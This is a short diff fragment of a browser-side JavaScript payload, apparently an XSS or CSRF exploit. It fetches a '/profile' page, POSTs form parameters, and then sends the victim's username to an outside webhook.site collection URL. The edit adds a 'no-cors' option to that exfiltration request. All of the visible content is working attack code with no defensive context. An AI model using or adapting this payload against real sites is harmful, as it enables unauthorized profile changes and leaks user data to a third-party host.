@@ -18,5 +18,5 @@ fetch('/profile')
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: params.toString()
-    }).then(() => fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?sucess=true&username=' + params.get('username')))
+    }).then(() => fetch('https://webhook.site/557a412f-f375-41c9-b27f-a1ec11ea0df5?sucess=true&username=' + params.get('username'), {mode: 'no-cors'}))
   })
